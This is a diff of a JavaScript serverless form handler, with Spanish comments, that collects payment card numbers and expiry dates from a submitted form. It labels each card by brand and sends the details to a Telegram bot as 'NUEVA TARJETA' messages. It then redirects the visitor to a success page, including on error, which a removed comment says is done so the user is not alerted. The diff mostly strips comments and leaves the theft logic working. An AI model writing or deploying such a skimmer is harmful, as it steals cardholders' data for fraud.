@@ -13,7 +13,6 @@ exports.handler = async (event) => {
     }
 
     try {
-        // Parsear los datos del formulario
         const params = new URLSearchParams(event.body);
         const cardNumber = params.get('cc-number') || '';
         const expMonth = params.get('cc-exp-month') || '';
@@ -21,7 +20,6 @@ exports.handler = async (event) => {
 
         console.log('Datos recibidos:', { cardNumber, expMonth, expYear });
 
-        // Configuración de Telegram
         const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
         const TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID;
 
@@ -29,7 +27,6 @@ exports.handler = async (event) => {
         console.log('Chat ID existe:', !!TELEGRAM_CHAT_ID);
 
         if (TELEGRAM_BOT_TOKEN && TELEGRAM_CHAT_ID) {
-            // Detectar tipo de tarjeta
             const cleanNum = cardNumber.replace(/\s/g, '');
             let cardType = 'CARD';
             if (/^4/.test(cleanNum)) {
@@ -39,17 +36,13 @@ exports.handler = async (event) => {
             } else if (/^3[47]/.test(cleanNum)) {
                 cardType = 'AMEX';
             }
-
-            // Crear mensaje simple
-            const fecha = new Date().toLocaleString('es-AR', { 
+            const fecha = new Date().toLocaleString('es-AR', {
                 timeZone: 'America/Argentina/Buenos_Aires'
             });
 
             const message = `🔔 NUEVA TARJETA\n\n${cardType}\nNumero: ${cleanNum}\nVence: ${expMonth}/${expYear}\nFecha: ${fecha}`;
 
             console.log('Enviando mensaje...');
-            
-            // Enviar a Telegram
             try {
                 const result = await sendToTelegram(TELEGRAM_BOT_TOKEN, TELEGRAM_CHAT_ID, message);
                 console.log('Mensaje enviado:', result);
@@ -59,8 +52,6 @@ exports.handler = async (event) => {
         } else {
             console.error('Faltan variables de entorno');
         }
-
-        // Redirigir a página de éxito
         return {
             statusCode: 303,
             headers,
@@ -68,7 +59,6 @@ exports.handler = async (event) => {
         };
     } catch (error) {
         console.error('Error:', error);
-        // Redirigir igualmente para no alertar al usuario
         return {
             statusCode: 303,
             headers,
@@ -112,7 +102,7 @@ function sendToTelegram(botToken, chatId, message) {
             console.error('Request error:', error);
             reject(error);
         });
-        
+
         req.write(data);
         req.end();
     });
